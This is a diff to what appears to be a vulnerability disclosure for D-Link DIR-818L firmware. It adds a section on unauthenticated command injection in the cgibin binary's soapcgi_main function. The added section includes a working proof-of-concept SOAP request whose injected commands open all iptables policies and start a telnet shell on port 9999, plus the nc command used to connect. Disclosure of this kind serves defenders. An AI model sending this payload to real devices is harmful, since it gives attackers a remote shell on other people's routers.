@@ -1,3 +1,4 @@
+# one
 # Firmware:
 DIR818L_FW105b01 A1:
 # Detail:
@@ -43,3 +44,37 @@ os.system('telnet ' + str(ip))
 ![0SOP(3D2535@D%$S4@UNTUP](https://user-images.githubusercontent.com/84966968/178105914-f00d0cdf-c38c-4e3c-9059-bd30cd36bf89.png)
 
 I looked it up online and it looks like it's been there for a long time
+# two
+# Firmware:
+DIR818L_FW105b01 A1:
+# Detail:
+Command execution exists in the cgibin binary
+I found unauthenticated remote code execution vulnerability in function of binary.soapcgi_main
+
+![WVG2G2 4{ZPVDJT H63_1GU](https://user-images.githubusercontent.com/84966968/178108334-f4b1b466-b613-4de8-901c-1cd9179e141a.png)
+
+![HF@CU3E9~8YDFE3N 353GVQ](https://user-images.githubusercontent.com/84966968/178108325-989782f0-6e15-48d0-9432-97d9a5d33203.png)
+
+Unfiltered functions result in being spliced into the system command
+# poc:
+```
+#nc 192.168.0.1 49512
+
+POST /soap.cgi?service=whatever-control;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -t nat -P PREROUTING ACCEPT;iptables -t nat -P OUTPUT ACCEPT;iptables -t nat -P POSTROUTING ACCEPT;telnetd -p 9999;whatever-invalid-shell HTTP/1.1
+Host: 192.168.100.1:49152
+Accept-Encoding: identity
+Content-Length: 16
+SOAPAction: "whatever-serviceType#whatever-action"
+Content-Type: text/xml
+
+```
+We can see that port 9999 is opened
+
+![6D2PDT$5JB Y)73YUU8PI)T](https://user-images.githubusercontent.com/84966968/178108466-7ed253de-518f-4ce6-b94b-a691381cc2c4.png)
+
+```
+nc 192.168.0.1 9999
+```
+![5%EK6 ~$P)UO}`4OT5HP2LR](https://user-images.githubusercontent.com/84966968/178108485-09ffc0fa-b8d5-4d45-b7f8-776922f1136a.png)
+
+This bug is also a bug that has appeared in other versions
